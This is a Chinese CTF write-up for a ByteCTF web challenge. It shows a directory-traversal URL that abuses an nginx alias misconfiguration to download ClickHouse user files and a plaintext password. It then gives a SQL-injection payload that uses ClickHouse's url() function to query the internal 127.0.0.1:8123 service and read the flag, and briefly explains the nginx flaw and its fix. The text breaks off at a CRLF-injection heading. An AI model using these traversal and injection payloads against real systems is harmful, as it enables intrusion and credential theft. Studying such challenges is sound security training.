第一步：

nginx配置不当导致目录穿越

http://39.105.175.150:30001/files../var/lib/clickhouse/access/

有个sql文件 下载下来后拿到数据库密码


ATTACH USER user_01 IDENTIFIED WITH plaintext_password BY 'e3b0c44298fc1c149afb';

ATTACH GRANT SELECT ON ctf.* TO user_01;

通过其自带内网的http服务登录user_01拿到flag

```php
http://39.105.175.150:30001/?id=1 union all select extractTextFromHTML(html) FROM url('http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520*%2520from%2520ctf.flag',RawBLOB,'html String');--
# ByteCTF{e3b0c44298fc1c149afbf4c8}
```

知识点：

ngnix配置不当导致目录穿越

Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。
错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：

利用方法：

![](https://img-blog.csdnimg.cn/20181116174450974.png)

穿越上层目录

![](https://img-blog.csdnimg.cn/20181116174455219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2Mzc0ODk2,size_16,color_FFFFFF,t_70)

漏洞修复

![](https://img-blog.csdnimg.cn/20181116174504524.png)

![](https://img-blog.csdnimg.cn/20181116174507397.png)

crlf注入：


